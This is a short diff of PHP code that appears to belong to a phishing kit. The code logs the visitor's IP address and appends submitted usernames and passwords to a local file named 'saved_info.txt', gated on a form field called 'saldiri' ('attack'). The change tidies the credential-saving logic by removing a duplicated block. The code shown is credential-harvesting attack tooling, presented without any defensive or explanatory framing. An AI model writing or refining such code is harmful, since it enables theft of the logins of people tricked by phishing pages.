@@ -13,12 +13,7 @@ else
       $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
     }
 if (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['saldiri'])) {
-
-$save = fopen("saved_info.txt","a+");
-$username = $_POST['username'];
-$password = $_POST['password'];
-if (isset($_POST['username']) && isset($_POST['password'])) {
-
+	
 $save = fopen("saved_info.txt","a+");
 $username = $_POST['username'];
 $password = $_POST['password'];
